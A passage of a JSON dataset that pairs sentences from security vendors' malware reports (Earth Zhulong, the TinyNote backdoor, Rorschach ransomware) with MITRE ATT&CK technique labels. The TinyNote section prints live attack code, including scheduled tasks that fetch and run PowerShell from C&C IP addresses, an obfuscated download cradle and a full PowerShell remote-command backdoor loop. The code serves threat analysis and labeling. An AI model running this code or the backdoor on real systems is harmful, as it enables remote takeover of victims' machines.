            "Trend Micro Vision One can help you prevent threats like this with multiple security layers across all platforms, and its intuitive threat detection, investigation and response system makes it a key factor to stop Earth Zhulong\u2019s evolving methods of infiltrating systems. ",
            "Indicators of compromise (IOCs) Download the full list of IOCs here. ",
            "MITRE Tactics Techniques Discovery T1087 - Account Discovery T1482 - Domain Trust Discovery Execution T1204.002 - User Execution: Malicious File Defense Evasion T1574.002 - Hijack Execution Flow: DLL Side-Loading T1055 - Process Injection T1070.006 - Timestomp T1140 - Deobfuscate/Decode Files or Information T1070 - Indicator Removal T1562.010 - Downgrade Attack Persistence T1053.005 - Scheduled",
            "Task Privilege Escalation T1484 - Domain Policy Modification T1078 - Valid Account Command and Control T1071.001 - Application Layer Protocol: Web Protocols T1090.001 - Internal Proxy T1090.002 - External Proxy Authors Ted Lee Threat Researcher "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1027",
                "T1106"
            ],
            [
                "T1484.001"
            ],
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1055",
                "T1204.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055",
                "T1484.001"
            ],
            [
                "T1484.001"
            ],
            [],
            [
                "T1484.001",
                "T1053.005"
            ],
            [],
            [
                "T1053.005"
            ],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1574.002"
            ],
            [],
            [
                "T1574.002"
            ],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1574.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1106"
            ],
            [
                "T1140",
                "T1071.001"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [
                "T1090",
                "T1105",
                "T1059.003"
            ],
            [],
            [
                "T1070.004"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1070.004"
            ],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1574.002"
            ],
            [
                "T1027"
            ],
            [
                "T1484.001"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Malware Spotlight Camaro Dragons TinyNote Backdoor",
        "cti_report": [
            "title: Malware Spotlight:",
            "Camaro Dragon\u2019s TinyNote Backdoor url: https://research.checkpoint.com/2023/malware-spotlight-camaro-dragons-tinynote-backdoor/ Executive summary Since early January 2023, there has been a notable surge in activity targeting European foreign affairs entities linked to Southeast and East Asia.",
            "The threat actors responsible are tracked by Check Point Research as Camaro Dragon and are associated with a broad network of espionage operations aligned with Chinese interests.",
            "Camaro Dragon overlaps with previously reported activities conducted by state-sponsored Chinese threat actors, namely Mustang Panda.",
            "A portion of the group\u2019s attack toolset and underlying infrastructure was thoroughly described by fellow ESET researchers in their detailed technical paper on the MQsTTang backdoor.",
            "Check Point Research analysis of these attacks also has uncovered a malicious TP-Link router firmware containing a custom implant named Horse Shell, which allows the threat actors to maintain persistent access and build anonymous infrastructure using compromised routers. ",
            "In this report, we analyze another previously undisclosed backdoor associated with this cluster of activity which shares with it not only a common infrastructure but also the same high-level intelligence-gathering goal. ",
            "Key findings: A previously unknown Go-based backdoor called TinyNote was found on one of the Camaro Dragon distribution servers, in addition to being spotted in the wild.",
            "The malware samples also communicate with other known C&C servers attributed to Camaro Dragon. ",
            "The TinyNote backdoor is distributed with names related to foreign affairs matters, and likely targets Southeast and East Asian embassies. ",
            "The backdoor performs a bypass of the Indonesian antivirus SmadAV, a security tool popular in Southeast Asian countries, such as Myanmar and Indonesia, and apparently used by a subset of the campaign targets. ",
            "The TinyNote backdoor is a first-stage malware only capable of basic machine enumeration and command execution via PowerShell or Goroutines.",
            "However, it focuses on redundancy to gain a foothold on the infected machine, including setting up multiple persistency tasks, communication with several different C&C servers, and different types of C&C command execution. ",
            "Introduction When we investigated a few delivery servers related to Camaro Dragon, we discovered that one of them exposed the threat actors\u2019 tools and files located on the server, only protected by basic HTTP Authorization with a known password.",
            "Among many other tools, previously discussed by other researchers, we discovered yet another backdoor that we named TinyNote.",
            "Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools. ",
            "The backdoor we found on the server, and its versions found in the wild, are executables with names related to foreign affairs, such as PDF_ Contacts List Of Invitated Deplomatic Members and Note_Documents_No.14-Tokyo-__From___Embassy___of___Russia_.",
            "This naming convention is similar to the one used at the same time by the MQsTTang backdoor versions discovered by ESET and found in VT.",
            "Similar to MQsTTang, the TinyNote backdoor samples also contain folder icon in an attempt to deceive victims about their real purpose. ",
            "The custom backdoor is written in the Go programming language.",
            "In the copyright and build information for the executables, the malware developers left a reference to code.mil.mm, the Myanmar military infrastructure, likely to add credibility to their tool.",
            "The actors\u2019 heightened interest in Myanmar entities and successful attacks carried out against them were previously discussed thoroughly.",
            "Our examination of the infrastructure led us to other findings that indicate the actors\u2019 interest in Taiwan\u2019s government entities as well. ",
            "The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.",
            "Despite its simplicity, it employs an interesting method of bypassing a very specific antivirus solution, suggesting the actors had issues gaining a foothold in specific environments. ",
            "SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.",
            "The developers of the antivirus position their solution as a \u201csecond-layer antivirus\u201d with \u201cactive users mostly from Indonesia, and other users mostly come from Southeast Asia and Africa Countries\u201d.",
            "The existence of the code that handles this specific antivirus once again confirms the focused targeting of Camaro Dragon campaigns and their knowledge of their victims\u2019 environments and solutions.",
            "It\u2019s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component SmadAVprotect32.exe to side-load their malicious DLL. ",
            "When any new process starts in the system, SmadAV scans all available windows.",
            "For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.",
            "If the window is visible, it adds this window owner\u2019s process ID to an array containing all current processes that have at least one visible window: Figure 1 \u2013 SmadAV code that collects a list of PIDs that have associated windows. ",
            "After iterating over all windows, the antivirus process iterates over this array and compares each process ID to the newly created process ID.",
            "If none is found, meaning the new process doesn\u2019t have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.",
            "This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code. ",
            "The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name \u201cEDIT\u201d which is one of the available default windows class names.",
            "The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.",
            "These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: ",
            "Figure 2 \u2013 A piece of malware code creates a specially crafted window to bypass the smadAV. ",
            "Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.",
            "But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.",
            "Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted. ",
            "Figure 3 \u2013 SmadAV detection on the Go backdoor with the removed bypassSMADAV function. ",
            "Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation. ",
            "First mode: persistence, PowerShell backdoor, and malware \u201cinstallation\u201d The malware checks if there is a \u201czip\u201d string in the file path.",
            "If this is not found, it continues the execution flow.",
            "First, it creates the directory c:\\programdata\\Robots.",
            "If this fails, the malware does not continue the execution, likely because the infected user only has low privileges. ",
            "Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create",
            "/TN test /SC MINUTE /MO 15 /TR \"powershell \\\"$r=[System.",
            "Net.WebRequest]::Create(\\\\\\\"http://5.188.33.190/Robots.txt\\\\\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\"\" /f schtasks /Create",
            "/TN test2 /SC MINUTE /MO 45 /TR \"powershell \\\"$r=[System.",
            "Net.WebRequest]::Create(\\\\\\\"http://103.159.132.91/Robots.txt\\\\\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\"\" /f At the time of execution, both servers returned the same code pointing to the third server: C:\\Windows\\System32\\cmd.exe /c \"start powershell.exe -nop",
            "-c set-alias exi iex;`$v1='iex (new-object net.webclient).dow';`$v2='nloadstring(''http://';`$v3='103.159.132.91/robots1.txt'')';exi(`$v1+`$v2+`$v3);\" The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with '_n1w_' string, and sends them back to the server in POST request: $WindowState = '[DllImport(\"user32.dll\")]",
            "public static extern bool ShowWindow(int handle, int stat);';add-type -name win -member $WindowState -namespace native;[native.win]::ShowWindow(([System.",
            "Diagnostics.",
            "Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0); $url=\"http://103.159.132.91:8081/\"; $postParams = 'result=start'; while (1 -eq 1) { try { $data =",
            "[System.",
            "Text.",
            "Encoding]::UTF8.GetBytes($postParams); $req =",
            "[System.Net.WebRequest]::Create($url); $req.",
            "ServicePoint.",
            "ConnectionLimit =65535; If ($req.",
            "CurrentConnections -ge 10000) { $req.",
            "CloseConnectionGroup(\"\") } $req.",
            "Expect100Continue = $false; #$req.",
            "Timeout = 10000; $req.",
            "Method = \"POST\"; $req.",
            "ContentType = \"application/x-www-form-urlencoded\"; $req.",
            "ContentLength = $data.",
            "Length; $Stream = $req.GetRequestStream(); $Stream.",
            "Write($data, 0, $data.",
            "Length);$Stream.",
            "Flush();$Stream.",
            "Close(); #waiting remote [System.Net.",
            "WebResponse] $resp = $req.GetResponse();$header=$resp.",
            "GetResponseHeader('CMD'); $d =",
            "[System.Convert]::FromBase64String($header); $Ds =",
            "Encoding]::UTF8.GetString($d);$result = \"\"; Foreach ($string in invoke-expression $Ds){$result=$result+'_n1w_'+$string;}; $result =",
            "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result)); $postParams = \"result=$result\"; } catch{}; }; ",
            "The malware then copies itself to the zip file with the name [16 random characters].zip in c:\\users\\public\\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\\users\\public\\pMiOxI3G44Igrpq7.zip\\. Both the file inside the zip and the unzipped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe. ",
            "Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create",
            "/TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR \"explorer.exe c:\\users\\public\\8NaZrCq3pGeDRXKF.zip\\8NaZr.exe\" /f Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a \u201czip\u201d path.",
            "First, the malware enumerates the system for the following data and concatenates it to one string: ",
            "The current system username The current username home folder The system\u2019s network interfaces (name, MacAddress, description) ",
            "Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.",
            "It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php ",
            "The encoded enumeration data is stored in a cookie called SSN.",
            "Other headers in the request are constructed from serval random values.",
            "The hostname header is selected from the following list: www.google.com www.facebook.com www.gstatic.com twitter.com The user-agent is also randomized and is selected from the following list: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0)",
            "Gecko/20100101 Firefox/103.0 Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0)",
            "Gecko/20100101 Firefox/63.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0",
            "Safari/537.36 The expected result from the server is a JSON with the following structure: {\"msg\":\"[BASE64-ENCODED COMMAND]\"} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop. ",
            "Attribution ",
            "In addition to the fact that one of the backdoor versions was found on the Camaro Dragon distribution server, there are other strong connections between the actors and the TinyNote malware: The server 103.159.132[.]91, where one of the versions of the malware was first found behaves like the C&C server of the backdoor, and was also a delivery server for the MQsTTang backdoor during the same time period. ",
            "Another C&C server, 103.169.90[.]132, is known to be used by the threat actors continuously. ",
            "The victimology and lures are consistent with the latest Camaro Dragon campaigns, including the activity associated with the MQsTTang backdoor.",
            "In addition, the actors also keep using a \u201cfolder\u201d icon and a specific naming convention for some of their backdoors seen since early 2023. ",
            "The third C&C server, 5.188.33[.]190, has rather unique SSL certificates with Alternative names mail.mofa.gov.tw, intra.mofa.gov.tw, and *.mofa.gov.tw.",
            "Another server with the same certificate, 23.106.123[.]59 is currently redirecting to the official infrastructure of the government of Taiwan, but likely was used for the additional attacks by the threat actor. ",
            "Conclusion The TinyNote backdoor highlights the targeted approach of Camaro Dragon and the extensive research they conduct prior to infiltrating their intended victims\u2019 systems.",
            "Although the backdoor is not technically complex, it employs several noteworthy tactics to establish an initial foothold in the compromised systems.",
            "These include the utilization of Golang, a programming language rarely used in Camaro Dragon tools, minimal lightweight functionality, and embedded bypass of a specific antivirus software commonly installed on potential targets.",
            "The simultaneous use of this backdoor together with other tools with different levels of technical advancement implies that the threat actors are actively seeking to diversify their attack arsenal. ",
            "IOCs f0b081ca58b6c253aa0014847c62dbad 6a2204b32a60aed0a3403c63ad2a529c 5.188.33[.]190 103.169.90[.]132 103.159.132[.]91 23.106.123[.]59 Check Point Customers remain protected: Threat Emulation provides comprehensive coverage of attack tactics, file types, and operating systems, powered by ThreatCloud AI \u2013 the brain behind all of Check Point\u2019s Security. ",
            "The post Malware Spotlight: Camaro Dragon\u2019s TinyNote Backdoor appeared first on Check Point Research. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [
                "T1574.002"
            ],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1105",
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [
                "T1033"
            ],
            [
                "T1033",
                "T1082"
            ],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Rorschach  A New Sophisticated and Fast Ransomware  Check Point Research",
        "cti_report": [
            "title: Rorschach \u2013 A New Sophisticated and Fast Ransomware - Check Point Research url: https://research.checkpoint.com/2023/rorschach-a-new-sophisticated-and-fast-ransomware/ Research by: Jiri Vinopal, Dennis Yarizadeh and Gil Gekker Key Findings: Check Point Research (CPR) and Check Point Incident Response Team (CPIRT) encountered a previously unnamed ransomware strain, we dubbed Rorschach, deployed against a US-based company. ",
            "Rorschach ransomware appears to be unique, sharing no overlaps that could easily attribute it to any known ransomware strain.",
            "In addition, it does not bear any kind of branding which is a common practice among ransomware groups. ",
            "The ransomware is partly autonomous, carrying out tasks that are usually manually performed during enterprise-wide ransomware deployment, such as creating a domain group policy (GPO).",
            "In the past, similar functionality was linked to LockBit 2.0. ",
            "The ransomware is highly customizable and contains technically unique features, such as the use of direct syscalls, rarely observed in ransomware.",
            "Moreover, due to different implementation methods, Rorschach is one of the fastest ransomware observed, by the speed of encryption. ",
            "The ransomware was deployed using DLL side-loading of a Cortex XDR Dump Service Tool, a signed commercial security product, a loading method which is not commonly used to load ransomware.",
            "The vulnerability was properly reported to Palo Alto Networks. ",
            "Introduction While responding to a ransomware case against a US-based company, the CPIRT recently came across a unique ransomware strain deployed using a signed component of a commercial security product.",
            "Unlike other ransomware cases, the threat actor did not hide behind any alias and appears to have no affiliation to any of the known ransomware groups.",
            "Those two facts, rarities in the ransomware ecosystem, piqued CPR interest and prompted us to thoroughly analyze the newly discovered malware. ",
            "Throughout its analysis, the new ransomware exhibited unique features.",
            "A behavioral analysis of the new ransomware suggests it is partly autonomous, spreading itself automatically when executed on a Domain Controller (DC), while it clears the event logs of the affected machines.",
            "In addition, it\u2019s extremely flexible, operating not only based on a built-in configuration but also on numerous optional arguments which allow it to change its behavior according to the operator\u2019s needs.",
            "While it seems to have taken inspiration from some of the most infamous ransomware families, it also contains unique functionalities, rarely seen among ransomware, such as the use of direct syscalls. ",
            "The ransomware note sent out to the victim was formatted similarly to Yanluowang ransomware notes, although other variants dropped a note that more closely resembled DarkSide ransomware notes (causing some to mistakenly refer to it as DarkSide).",
            "Each person who examined the ransomware saw something a little bit different, prompting us to name it after the famous psychological test \u2013 Rorschach Ransomware. ",
            "Execution Flow As observed in the wild, Rorschach execution uses these three files: cy.exe \u2013 Cortex XDR Dump Service Tool version 7.3.0.16740, abused to side-load winutils.dll winutils.dll \u2013 Packed Rorschach loader and injector, used to decrypt and inject the ransomware. ",
            "config.ini \u2013 Encrypted Rorschach ransomware which contains all the logic and configuration. ",
            "Upon execution of cy.exe, due to DLL side-loading, the loader/injector winutils.dll is loaded into memory and runs in the context of cy.exe.",
            "The main Rorschach payload config.ini is subsequently loaded into memory as well, decrypted and injected into notepad.exe, where the ransomware logic begins. ",
            "Figure 1 \u2013 Rorschach\u2019s High Level Execution Flow on both endpoints and on Domain Controllers. ",
            "Security Solution Evasion Rorschach spawns processes in an uncommon way, running them in SUSPEND mode and giving out falsified arguments to harden analysis and remediation efforts.",
            "The falsified argument, which consists of a repeating string of the digit 1 based on the length of the real argument, rewritten in memory and replaced with the real argument, resulting in a unique execution: Figure 2 \u2013 Rorschach\u2019s process tree spawns processes with falsified arguments. ",
            "The ransomware uses this technique to run the following operations: ",
            "Attempt to stop a predefined list of services, using net.exe stop. ",
            "Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell. ",
            "Disable the Windows firewall, using netsh.exe Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.",
            "Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its files into the scripts folder of the DC, and deletes them from the original location. ",
            "Rorschach then creates a group policy (see Appendix C) that copies itself into the %Public% folder of all workstations in the domain. ",
            "The ransomware creates another group policy in an attempt to kill a list of predefined list of processes.",
            "This is done by creating a schedule task invoking taskkill.exe. ",
            "Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach\u2019s main executable with the relevant arguments. ",
            "Our colleagues in AhnLab published a more thorough behavioral analysis of another Rorschach variant which provides further details into the operations. ",
            "Ransomware Analysis ",
            "In addition to the ransomware\u2019s uncommon behavior described above, the Rorschach binary itself contains additional interesting features, differentiating it further from other ransomware. ",
            "Binary and Anti-Analysis Protection ",
            "The actual sample is protected carefully, and requires quite a lot of work to access.",
            "First, the initial loader/injector winutils.dll is protected with UPX-style packing.",
            "However, this is changed in such a way that it isn\u2019t readily unpacked using standard solutions and requires manual unpacking.",
            "After unpacking, the sample loads and decrypts config.ini, which contains the ransomware logic. ",
            "After Rorschach is injected into notepad.exe, it\u2019s still protected by VMProtect.",
            "This results in a crucial portion of the code being virtualized in addition to lacking an IAT table.",
            "Only after defeating both of these safeguards is it possible to properly analyze the ransomware logic. ",
            "Security Solution Evasion Although Rorschach is used solely for encrypting an environment, it incorporates an unusual technique to evade defense mechanisms.",
            "It makes direct system calls using the \u201csyscall\u201d instruction.",
            "While previously observed in other strains of malware, it\u2019s quite startling to see this in ransomware. ",
            "The procedure involves utilizing the instruction itself, and it goes as follows: ",
            "The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation. ",
            "Rorschach then stores the numbers in a table for future use. ",
            "When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API. ",
            "In other words, the malware first creates a syscall table for NT APIs used for file encryption: Figure 3 \u2013 Creation of syscall table for certain NT APIs. ",
            "The end of the table is a section with the relevant syscall numbers: Figure 4 \u2013 Section containing the syscall table. ",
            "The example below shows how the syscall numbers are used: Figure 5 \u2013 Example use of direct syscall. ",
            "This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls. ",
            "Command Line Arguments ",
            "In addition to the hardcoded configuration, the ransomware comes with multiple built-in options, probably for the operators comfort.",
            "All of them are hidden, obfuscated, and not accessible without reverse-engineering the ransomware.",
            "This table contains some of the arguments that we discovered: ArgumentExample ParameterDescription\u2013run=1234Password needed to run the sample, possibly built on demand.\u2013nomutex=1Do not create a mutex, therefore do not insure that only a single instance is running.\u2013log=1Create log files.\u2013nodel=0Do not self-delete on execution.\u2013path=\u201cC:\u201dEncrypt only the following path.\u2013noshare=1Do not encrypt shares.\u2013pt=\u201dC:.dll\u201dExplicitly state the loader DLL.\u2013cg=\u201dC:.ini\u201dExplicitly state the configuration file that stores the malware.\u2013we=\u201dC:.exe\u201dExplicitly state the main executable.\u2013diskpart=1Run diskpart.exe /s AppData_x.txt that removes read-",
            "only volume attributes.\u2013nobk=1Do not change the wallpaper of the infected machine.\u2013thread=4Number of threads per CPU.\u2013at=2023/03/24 05:04:20Activation time (trigger time).\u2013nomail=1Do not create a ransom note.",
            "This is only a partial list, with additional arguments suggesting networking capabilities, such as listen, srv and hostfile. ",
            "Example of how some of these arguments are used: cy.exe --run=1234 --nomutex=0 --log=1 --nodel=1 --path=\"C:\\Myfolder\"",
            "--full=1 --diskpart=1",
            "--nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using. ",
            "It exits if the return value is commonly used in CIS countries: { 0x042b: \"Armenian_Armenia\", 0x042c: \"Azeri_Latin\", 0x043f: \"Kazakh\", 0x082c: \"Azeri_Cyrillic\", 0x419: \"Russian\", 0x422: \"Ukrainian\", 0x423: \"Belarusian\", 0x428: \"Tajik\", 0x437: \"Georgian\", 0x440: \"Kyrgyz_Cyrillic\", 0x442: \"Turkmen\", 0x443: \"Uzbek_Latin\", 0x819: \"Russian_Moldava\", 0x843: \"Uzbek_Cyrillic\" } Encryption Process The Rorschach ransomware employs a highly effective and fast hybrid-cryptography scheme, which blends the curve25519 and eSTREAM cipher hc-128 algorithms for encryption purposes.",
            "This process only encrypts a specific portion of the original file content instead of the entire file.",
            "The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.",
            "The shared secret is calculated through curve25519, using both the generated private key and a hardcoded public key.",
            "Finally, the computed SHA512 hash of the shared secret is used to construct the KEY and IV for the eSTREAM cipher hc-128. ",
            "Figure 6 \u2013 The Rorschach hybrid-cryptography scheme. ",
            "Analysis of Rorschach\u2019s encryption routine suggests not only the fast encryption scheme mentioned previously but also a highly effective implementation of thread scheduling via I/O completion ports.",
            "In addition, it appears that compiler optimization is prioritized for speed, with much of the code being inlined.",
            "All of these factors make us believe that we may be dealing with one of the fastest ransomware out there. ",
            "To verify our hypothesis, we conducted five separate encryption speed tests in a controlled environment (with 6 CPUs, 8192MB RAM, SSD, and 220000 files to be encrypted), limited to local drive encryption only.",
            "To provide a meaningful comparison with other known fast ransomware, we compared Rorschach with the notorious LockBit v.3. ",
            "The result of the speed tests: RansomwareAverage approximate time of encryptionLockBit v.37 minutesRorschach4 minutes, 30 secondsIt turned out that we have a new speed demon in town.",
            "What\u2019s even more noteworthy is that the Rorschach ransomware is highly customizable.",
            "By adjusting the number of encryption threads via the command line argument --thread, it can achieve even faster times. ",
            "Technical Similarity to Other Ransomware ",
            "When we compared Rorschach to other well-known ransomware families, we noticed that Rorschach uses a variety of time-honored methods together with some novel ideas in the ransomware industry.",
            "The name itself, \u201cRorschach\u201d, is quite self-explanatory; with deep reverse engineering of the code and its logic, we found certain similarities with some of the more technically advanced and established ransomware groups. ",
            "We discussed Rorschach\u2019s hybrid-cryptography scheme in detail above, but we suspect that this routine was borrowed from the leaked source code of Babuk ransomware.",
            "See the following code snippets as examples: Figure 7 \u2013 Hybrid-cryptography scheme of Rorschach vs. Babuk. ",
            "Rorschach\u2019s inspiration from Babuk is evident in various routines, including those responsible for stopping processes and services.",
            "In fact, the code used to stop services through the service control manager appears to have been directly copied from Babuk\u2019s source code: Figure 8 \u2013 Stopping predefined list of services \u2013 Rorschach vs. Babuk. ",
            "It is also worth noting that the list of services to be stopped in Rorschach\u2019s configuration is identical to that in the leaked Babuk source code.",
            "However, the list of processes to be stopped differs slightly, as Rorschach omits notepad.exe, which is used as a target for code injection. ",
            "Rorahsach takes inspiration from another ransomware strain: LockBit.",
            "First, the list of languages used to halt the malware is exactly the same list that was used in LockBit v2.0 (although the list is commonly used by many Russian speaking groups, and not just LockBit).",
            "However, the I/O Completion Ports method of thread scheduling is another component where Rorschach took some inspiration from LockBit.",
            "The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0. ",
            "Figure 9 \u2013 Renaming of encrypted file using NtSetInformationFile. ",
            "As noted before, Rorschach\u2019s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.",
            "This makes finding similarities with other well-known ransomware families a real brain-buster.",
            "But we can still say that Rorschach took the best from the ransomware families with the highest reputation, and then added some unique features of its own. ",
            "Ransom Notes As we noted, Rorschach does not exhibit any clear-cut overlaps with any of the known ransomware groups but does appear to draw inspiration from some of them. ",
            "We mentioned previously that Ahnlab reported a similar attack earlier this year.",
            "While it was carried out through different means, the ransomware described in the report triggers an almost identical execution flow.",
            "However, the resulting ransom note was completely different.",
            "The note was actually very similar to those issued by DarkSide, which probably led to this new ransomware being named \u201cDarkSide,\u201d despite the group being inactive since May 2021. ",
            "The Rorschach variant we analyzed leaves a different ransom note based on the structure used by Yanlowang, another ransomware group: Figure 10 \u2013 Ransom note from Rorschach. ",
            "Conclusion Our analysis of Rorschach reveals the emergence of a new ransomware strain in the crimeware landscape.",
            "Its developers implemented new anti-analysis and defense evasion techniques to avoid detection and make it more difficult for security software and researchers to analyze and mitigate its effects.",
            "Additionally, Rorschach appears to have taken some of the \u2018best\u2019 features from some of the leading ransomwares leaked online, and integrated them all together.",
            "In addition to Rorschach\u2019s self-propagating capabilities, this raises the bar for ransom attacks.",
            "The operators and developers of the Rorschach ransomware remain unknown.",
            "They do not use branding, which is relatively rare in ransomware operations. ",
            "Our findings underscore the importance of maintaining strong cybersecurity measures to prevent ransomware attacks, as well as the need for continuous monitoring and analysis of new ransomware samples to stay ahead of evolving threats.",
            "As these attacks continue to grow in frequency and sophistication, it is essential for organizations to remain vigilant and proactive in their efforts to safeguard against these threats. ",
            "Harmony Endpoint provides runtime protection against ransomware with instant automated remediation, even in offline mode. ",
            "When running on a machine infected with the Rorschach ransomware, Harmony Endpoint Anti-ransomware detected the encryption process in different folders, including modifications made to Harmony Endpoint \u2018honeypot\u2019 files.",
            "It ran a ranking algorithm that provided a verdict identifying the process as a ransomware. ",
